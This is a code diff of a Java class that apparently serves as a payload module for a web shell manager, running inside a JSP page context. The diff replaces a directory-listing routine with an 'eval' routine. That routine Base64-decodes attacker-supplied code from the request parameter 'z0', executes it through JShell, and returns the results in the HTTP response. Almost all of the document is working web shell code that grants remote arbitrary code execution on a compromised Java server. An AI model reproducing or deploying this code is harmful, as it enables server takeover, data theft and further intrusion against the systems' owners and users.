@@ -1,14 +1,17 @@
-import java.io.*;
+import jdk.jshell.JShell;
+import jdk.jshell.SnippetEvent;
+
+import java.io.OutputStream;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
-public class file_init extends ClassLoader
+public class eval extends ClassLoader
 {
-    public file_init(ClassLoader objParent) { super(objParent); }
-    public file_init() { super(file_init.class.getClassLoader()); }
+    public eval(ClassLoader objParent) { super(objParent); }
+    public eval() { super(eval.class.getClassLoader()); }
 
     private Map<String, String> fnParseParams(String szParamStr)
     {
@@ -96,7 +99,7 @@ public class file_init extends ClassLoader
         Object objRequest = null;
         Object objResponse = null;
         OutputStream osClient = null;
-        
+
         try
         {
             Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
@@ -126,106 +129,35 @@ public class file_init extends ClassLoader
 
             Map<String, String> mapParams = fnParseParams(szParam);
             String szSplitter = mapParams.get("splitter");
-            
-            String szCurrentDir = "";
+            StringBuffer sb = new StringBuffer();
+
+            String z0 = mapParams.get("z0");
+            String szCode = new String(Base64.getDecoder().decode(z0));
+
             try
             {
-                Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
-                Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
+                JShell jshell = JShell.create();
+                List<SnippetEvent> events = jshell.eval(szCode);
 
-                Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
-                String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});
-
-                Method fnGetServletPath = objRequest.getClass().getMethod("getServletPath", new Class[0]);
-                String szServletPath = (String) fnGetServletPath.invoke(objRequest, new Object[0]);
-
-                szRootPath = szRootPath.replace("\\", "/");
-                szServletPath = szServletPath.replace("\\", "/");
-                
-                if (!szRootPath.endsWith("/"))
-                    szRootPath += "/";
-                if (szServletPath.startsWith("/"))
-                    szServletPath = szServletPath.substring(1);
-                
-                String szFullPath = szRootPath + szServletPath;
-
-                szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
-                szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
-
-            }
-            catch (Exception e)
-            {
-                try
+                for (SnippetEvent event : events)
                 {
-                    Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
-                    Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
-                    Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
-                    String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});
+                    if (event.status() == jdk.jshell.Snippet.Status.VALID && event.value() != null)
+                        sb.append(event.value());
 
-                    Method fnGetRequestURI = objRequest.getClass().getMethod("getRequestURI", new Class[0]);
-                    String szURI = (String) fnGetRequestURI.invoke(objRequest, new Object[0]);
-
-                    String szFullPath = szRootPath.replace("\\", "/") + szURI.replace("\\", "/");
-                    szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
-                    szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
-                }
-                catch (Exception ex)
-                {
-                    szCurrentDir = System.getProperty("user.dir");
+                    if (event.exception() != null)
+                        sb.append(event.exception().getMessage());
                 }
             }
-
-            if (szCurrentDir.length() > 1 && szCurrentDir.endsWith(java.io.File.separator)) {
-                szCurrentDir = szCurrentDir.substring(0, szCurrentDir.length() - 1);
-            }
-
-            boolean bIsWindows = System.getProperty("os.name").toLowerCase().contains("win");
-
-            StringBuilder sb = new StringBuilder();
-            
-            sb.append(szCurrentDir);
-            sb.append("|");
-            if (!bIsWindows)
+            catch (Exception ex)
             {
-                // Unix-like
-                sb.append("/");
-            }
-            else
-            {
-                File[] roots = File.listRoots();
-                if (roots != null)
-                {
-                    List<String> lsDrive = new ArrayList<>();
-                    for (File root : roots)
-                    {
-                        String szPath = root.getAbsolutePath();
-                        if (szPath.endsWith(("\\")))
-                            szPath = szPath.substring(0, szPath.length() - 1);
-
-                        lsDrive.add(szPath);
-                    }
-
-                    sb.append(String.join(",", lsDrive));
-                }
+                sb.append(ex.getMessage());
             }
 
-            String szOutput = sb.toString();
-
-            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes());
+            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
         }
         catch (Exception ex)
         {
-            if (osClient != null)
-            {
-                try
-                {
-                    StringWriter swTrace = new StringWriter();
-                    ex.printStackTrace(new PrintWriter(swTrace));
 
-                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
-                }
-                catch (Exception exIgnored) {}
-            }
         }
 
         return true;
